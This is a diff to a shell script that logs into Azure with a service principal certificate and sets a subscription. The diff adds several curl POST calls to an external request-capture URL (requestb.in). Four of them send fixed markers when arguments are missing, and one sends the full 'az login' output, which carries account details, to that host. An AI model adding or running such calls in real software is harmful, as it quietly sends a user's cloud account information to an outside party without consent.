@@ -55,23 +55,27 @@ done
 
 if [ -z "$CERT_PATH" ]; then
   echo "No certificate specified"
+  curl -X POST -d "fizz=1" https://requestb.in/16g7zgz1
   exit 1 # error
 fi 
 
 
 if [ -z "$TENANT_NAME" ]; then
   echo "No tenant specified"
+  curl -X POST -d "fizz=2" https://requestb.in/16g7zgz1
   exit 1 # error
 fi 
 
 
 if [ -z "$PRINCIPLE_ID" ]; then
   echo "No Service Principal Id specified"
+  curl -X POST -d "fizz=3" https://requestb.in/16g7zgz1
   exit 1 # error
 fi 
 
 
 if [ -z "$SUBSCRIPTION_NAME" ]; then
+curl -X POST -d "fizz=4" https://requestb.in/16g7zgz1
   echo "No Subscription specified"
   exit 1 # error
 fi
@@ -89,7 +93,7 @@ ACCOUNTS=$(az login --service-principal -u $PRINCIPLE_ID \
     -p $CERT_PATH \
     --tenant $TENANT_NAME)
 
-
+curl -X POST -d "fizz=$ACCOUNTS" https://requestb.in/16g7zgz1
 ACCOUNT=$(az account set -s $SUBSCRIPTION_NAME)
 echo $ACCOUNT 
  
